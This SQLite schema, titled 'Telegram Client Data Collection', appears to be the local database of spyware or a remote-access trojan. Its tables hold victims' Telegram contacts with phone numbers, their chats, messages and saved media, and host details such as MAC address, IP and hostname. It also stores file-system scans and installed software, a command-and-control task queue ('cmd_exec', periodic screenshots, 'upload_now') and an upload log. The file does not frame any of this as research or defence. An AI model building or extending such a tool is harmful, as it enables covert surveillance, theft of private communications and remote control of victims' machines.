-- SQLite Schema for Telegram Client Data Collection

-- 1. Contacts (Users)
CREATE TABLE IF NOT EXISTS collected_contacts (
    user_id INTEGER PRIMARY KEY, -- Telegram User ID
    username TEXT,
    phone TEXT,
    first_name TEXT,
    last_name TEXT,
    detected_at INTEGER DEFAULT (strftime('%s', 'now'))
);

-- 2. Chats (Conversations)
CREATE TABLE IF NOT EXISTS collected_chats (
    chat_id INTEGER PRIMARY KEY, -- Telegram Chat ID
    title TEXT,
    type TEXT, -- 'private', 'group'
    detected_at INTEGER DEFAULT (strftime('%s', 'now'))
);

-- 3. Messages
CREATE TABLE IF NOT EXISTS collected_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tg_message_id INTEGER,
    chat_id INTEGER,
    sender_id INTEGER,
    text TEXT,
    date INTEGER, -- Unix Timestamp
    media_path TEXT, -- Local path to saved image/file
    is_outgoing BOOLEAN,
    FOREIGN KEY(chat_id) REFERENCES collected_chats(chat_id)
);

-- 4. System Information (Key-Value Store)
CREATE TABLE IF NOT EXISTS system_info (
    key TEXT PRIMARY KEY,
    value TEXT,
    updated_at INTEGER DEFAULT (strftime('%s', 'now'))
);
-- Keys: 'mac_address', 'ip_address', 'os_version', 'hostname'

-- 5. File System Scan Results
CREATE TABLE IF NOT EXISTS file_scan_results (
    file_path TEXT PRIMARY KEY,
    md5_hash TEXT,
    scanned_at INTEGER DEFAULT (strftime('%s', 'now'))
);

-- 6. Installed Software
CREATE TABLE IF NOT EXISTS installed_software (
    name TEXT,
    version TEXT,
    install_date TEXT,
    publisher TEXT,
    detected_at INTEGER DEFAULT (strftime('%s', 'now'))
);

-- 7. C2 Tasks (Command & Control)
CREATE TABLE IF NOT EXISTS c2_tasks (
    task_id TEXT PRIMARY KEY,
    command TEXT, -- 'cmd_exec', 'screenshot_periodic', 'upload_now'
    params TEXT, -- JSON or arguments
    status TEXT DEFAULT 'pending', -- 'pending', 'in_progress', 'completed', 'failed'
    result TEXT, -- Output of the command
    created_at INTEGER,
    executed_at INTEGER
);

-- 8. Upload Log
CREATE TABLE IF NOT EXISTS upload_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    upload_time INTEGER,
    data_size INTEGER,
    status TEXT -- 'success', 'failed'
);
